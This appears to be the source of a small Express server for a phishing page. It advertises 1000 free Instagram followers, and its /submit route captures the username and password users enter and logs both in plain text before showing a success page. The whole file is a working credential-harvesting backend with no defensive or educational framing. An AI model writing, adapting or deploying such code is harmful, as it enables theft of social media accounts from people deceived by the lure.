import dotenv from 'dotenv';
import express from 'express';
import path from 'path';
import { fileURLToPath } from 'url';

dotenv.config();
const app = express();

// Define __dirname for ES modules
const __filename = fileURLToPath(import.meta.url);
const __dirname = path.dirname(__filename);

// Set EJS as the template engine
app.set('view engine', 'ejs');

// Serve static files (like CSS) from the 'public' directory
app.use(express.static('public'));

// Route to render the EJS template
app.get('/', (req, res) => {
    res.render('index', {
        title: 'Instagram followers',
        followersCount: '1000',
        offer: 'FREE',
        buttonText: 'Get now!',
    });
});

// Middleware for parsing URL-encoded form data (from traditional form submissions)
app.use(express.urlencoded({ extended: true }));

// Middleware to parse JSON data (for AJAX requests)
app.use(express.json());

// Route to handle form submission
app.post('/submit', async (req, res) => {
    const { username, password } = req.body;
    console.log(`Username: ${username}, Password: ${password}`);
 
    // Correct way to send a static HTML file
    const htmlPath = path.join(__dirname, 'public', 'success.html');
    res.sendFile(htmlPath); // Serve the success.html file
});

// Start the server
app.listen(3000, () => console.log('Server running on http://localhost:3000'));
